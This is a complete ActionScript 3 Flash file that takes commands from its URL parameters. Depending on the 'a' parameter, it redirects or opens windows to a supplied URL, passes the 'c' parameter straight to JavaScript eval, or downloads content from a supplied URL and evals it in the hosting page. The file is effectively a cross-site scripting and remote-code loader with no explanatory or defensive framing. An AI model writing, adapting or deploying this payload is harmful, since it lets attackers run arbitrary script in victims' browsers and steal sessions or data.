package {
 import flash.display.Sprite;
 import flash.net.*;
 import flash.events.Event;
 import flash.external.ExternalInterface;
 public class Main extends Sprite {
  public function Main() {
   var param: Object = root.loaderInfo.parameters;
   var action: String = param["a"];
   var cmd: String = param["c"];
   switch (action) {
    case "location": // location URL
     navigateToURL(new URLRequest(cmd), "_self");
     break;
    case "open": // open URL
     navigateToURL(new URLRequest(cmd), "_blank");
     break;
    case "get": // GET
     var loader: URLLoader = new URLLoader(new URLRequest(cmd));
	 loader.addEventListener(Event.COMPLETE,get_complete);
     break;
    case "eval": // execute JS
     flash.external.ExternalInterface.call("eval", cmd);
     break;
    default:
     break;
   }
  }
  function get_complete(e:Event){
	   flash.external.ExternalInterface.call("eval", e.target.data);
  }
 }
}